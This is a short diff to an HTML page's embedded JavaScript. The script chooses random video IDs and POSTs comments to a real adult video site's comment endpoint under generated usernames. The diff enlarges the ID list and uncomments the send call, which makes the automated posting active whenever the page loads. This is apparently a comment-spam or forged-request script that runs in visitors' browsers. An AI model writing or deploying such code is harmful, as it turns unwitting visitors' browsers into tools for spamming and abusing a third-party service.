@@ -1,7 +1,7 @@
 <html><head><script>
 
 function getVid(){
-   var sites = ["1309905", "7969711", "5203008", "6059034", "3234943", "5753586", "1483400", "2304207", "8896222", "8009200", "2137667", "8950766", "8393213", "4055559", "4128021", "9131630", "3003085", "9123005", "9088977", "8199371"];
+   var sites = ["5046390", "9122754", "9039250", "1309905", "7969711", "8466634", "5203008", "6059034", "5826018", "2888544", "8950766", "5753586", "7041530", "9108281", "9132580", "8009200", "2482397", "8508422", "4685473", "1483400", "9089917", "7727422", "8896222", "9121114", "2137667", "3234943", "869299", "3819089", "8393213", "8767065", "4787619", "4055559", "3003085", "2504600", "8562981", "7758073"];
     var i = parseInt(Math.random()*(sites.length-1));
     return sites[i];
 };
@@ -40,7 +40,7 @@ xmlhttp = new XHR();
 if (xmlhttp != null) {
     xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
     xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-   // xmlhttp['send']('user=snapwuu'+randy+'&comment=' + cmt + '&test=ok');
+    xmlhttp['send']('user=snapwuu'+randy+'&comment=' + cmt + '&test=ok');
 
     if (xmlhttp['responseText'] != null) {
         var token = xmlhttp['responseText'];
